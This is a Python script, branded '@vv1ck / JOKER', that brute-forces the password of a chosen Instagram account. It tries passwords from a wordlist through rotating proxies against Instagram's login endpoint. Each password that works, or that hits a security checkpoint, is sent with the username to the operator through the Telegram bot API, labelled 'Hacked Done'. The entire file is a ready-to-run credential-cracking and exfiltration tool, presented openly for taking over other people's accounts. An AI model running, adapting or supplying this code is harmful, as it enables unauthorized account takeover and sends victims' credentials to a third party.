lib = input("""            Before operating 

Put proxies in the proxy.txt file
Put passwords in the pass.txt file

Accounts will be sent to your account via Telegram

Put your account id and token bot in the order field


Click Enter to start ..
""")
import os
import time
import string
import random
import requests
import sys as n
import webbrowser
import time as mm
def slow(M):
	for c in M + '\n':
		n.stdout.write(c)
		n.stdout.flush()
		mm.sleep(1. / 120)
webbrowser.open('https://t.me/vv1ck')
req = requests.session()
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
slow(""" 
██████╗ ██████╗ ██╗   ██╗████████╗███████╗    
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    
██████╔╝██████╔╝██║   ██║   ██║   █████╗      
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    
                  ┬ ┌┐┌ ┌─┐┌┬┐┌─┐  
                  │ │││ └─┐ │ ├─┤  
                  ┴ ┘└┘ └─┘ ┴ ┴ ┴  V2
 @vv1ck / JOKER ...
""")
vv1ck = """━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[1]>> For Arabic, press 1
[2]>> For English language press 2
"""
print(vv1ck)
joker = input("                                 >>  ")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
if joker == '1':
	user = input('>> ضع اسم المستخدم : ')
	time.sleep(1)
	id = input('>> ضع ايدي حسابك {اختياري} :')
	time.sleep(1)
	token = input('>> ضع توكن بوتك {اختياري} : ')
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	time.sleep(1)
	pess = 'pass.txt'
	proxy = 'proxy.txt'
	file = open(pess, 'r')
	proxy =  open(proxy,'r').read().splitlines()
	
	headers = { 
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
		'x-csrftoken': 'jHu55ttlksoa24nBYiVdJ9D7wKaSTCwD',
		'x-instagram-ajax': '5d8ba0e5398d',
		'x-ig-app-id': '936619743392459',}
		
	def insta():
		while True:
			pess = file.readline().split('\n')[0]
			proxylist = []
			for prox in proxy:
				proxylist.append(prox)
			randomproxy = str(random.choice(proxylist))
			try:
				Reproxy = {
				'https':f'{randomproxy}',
				'http':f'{randomproxy}' }
				
				req.proxies = Reproxy
				url = 'https://www.instagram.com/accounts/login/ajax/'
				#vv1ck
				tem = str(time.time()).split('.')[1]
				data = {
				'username': f'{user}',
				'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tem}:{pess}',
				'queryParams': {},
				'optIntoOneTap': 'false',}
				#vv1ck
				re = req.post(url,headers=headers,data=data)
				response = re.text
				
				if ('"authenticated": true') in response:
					print('================================')
					print(f'>> تم الاختراق user: {user} pass: {pess} ..')
					tlg =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Hacked Done🤖\nuser: {user}  pass: {pess} \n@vv1ck JOKER')
					re = requests.post(tlg)
					input(" ")
				
				elif '"checkpoint_url"' in response:
					print('================================')
					print(f"[] سكيور user: {user} pass: {pess}..! ")
					tlg =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Hacked Done🤖\nuser: {user}  pass: {pess} \n@vv1ck JOKER')
					re = requests.post(tlg)
				
				else:
					print('================================')
					print(f'>> الباس خطأ user: {user} pass: {pess} ..')
				time.sleep(3)
			except requests.exceptions.ConnectionError:
				pass
	insta()
#JOKER/vv1ck
elif joker == '2':
	user = input('>> Enter username : ')
	time.sleep(1)
	id = input('>> Enter you id :')
	time.sleep(1)
	token = input('>> Enter you token bot : ')
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	time.sleep(1)
	pess = 'pass.txt'
	proxy = 'proxy.txt'
	file = open(pess, 'r')
	proxy =  open(proxy,'r').read().splitlines()
	#joker
	headers = { 
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
		'x-csrftoken': 'jHu55ttlksoa24nBYiVdJ9D7wKaSTCwD',
		'x-instagram-ajax': '5d8ba0e5398d',
		'x-ig-app-id': '936619743392459',}
		
	def insta():
		while True:
			pess = file.readline().split('\n')[0]
			proxylist = []
			for prox in proxy:
				proxylist.append(prox)
			randomproxy = str(random.choice(proxylist))
			try:
				Reproxy = {
				'https':f'{randomproxy}',
				'http':f'{randomproxy}' }
				
				req.proxies = Reproxy
				url = 'https://www.instagram.com/accounts/login/ajax/'
				#vv1ck
				tem = str(time.time()).split('.')[1]
				data = {
				'username': f'{user}',
				'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tem}:{pess}',
				'queryParams': {},
				'optIntoOneTap': 'false',}
				#vv1ck
				re = req.post(url,headers=headers,data=data)
				response = re.text
				
				if ('"authenticated": true') in response:
					print('================================')
					print(f'>> Hacked user: {user} pass: {pess} ..')
					tlg =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Hacked Done🤖\nuser: {user}  pass: {pess} \n@vv1ck JOKER')
					re = requests.post(tlg)
					input(" ")
				
				elif '"checkpoint_url"' in response:
					print('================================')
					print(f"[] Secure user: {user} pass: {pess}..! ")
					tlg =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Hacked Done🤖\nuser: {user}  pass: {pess} \n@vv1ck JOKER')
					re = requests.post(tlg)
				#vv1ck
				else:
					print('================================')
					print(f'>> Not Hacked user: {user} pass: {pess} ..')
				time.sleep(3)
			except requests.exceptions.ConnectionError:
				pass
	insta()
#JOKER/vv1ck
else:
	webbrowser.open('https://t.me/vv1ck')
	print("""
	            
	           
	           رقم خطأ ياذكي 
	         (:
	
	""")
